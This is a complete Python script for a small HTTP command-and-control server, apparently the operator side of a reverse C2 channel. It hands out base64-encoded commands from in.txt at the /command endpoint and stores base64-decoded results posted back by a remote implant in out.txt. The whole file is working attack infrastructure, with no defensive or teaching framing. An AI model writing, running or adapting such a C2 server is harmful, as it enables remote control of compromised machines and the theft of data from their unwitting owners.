#!/usr/bin/env python3

from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.request import urlparse
from base64 import b64encode, b64decode


# Helper    
def to_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64encode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer

def from_base64(buffer:str, encoding="utf-8", to_bytes=False):
    if isinstance(buffer, str): buffer = bytes(buffer, encoding=encoding)
    buffer = b64decode(buffer)
    if not to_bytes: buffer = str(buffer, encoding=encoding)
    return buffer
    
# Server
class ReverseC2Handler(SimpleHTTPRequestHandler):

    def do_GET(self):
        # URL check
        url = urlparse(self.path)
        if url.path != "/command": return super().do_GET()
        # Headers
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        command = b""
        try:
            # Check for commands
            command = open("in.txt", "r").read()
            if command == "": return
            open("in.txt", "w").write("")
            # Response
            command = to_base64(command, to_bytes=True)
        except:
            pass
        self.wfile.write(command)

    def do_POST(self):
        # Save result
        url = urlparse(self.path)
        if url.path != "/command": return super().do_POST()
        # Read
        content_length = int(self.headers.get("Content-Length"))
        result = self.rfile.read(content_length).decode("utf-8")
        result = from_base64(result)
        open("out.txt", "w").write(result)
        # Respond with nothing
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"")

def main():
    try:
        reverse_c2_handler = HTTPServer(('', 8080), ReverseC2Handler)
        reverse_c2_handler.serve_forever()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__': main()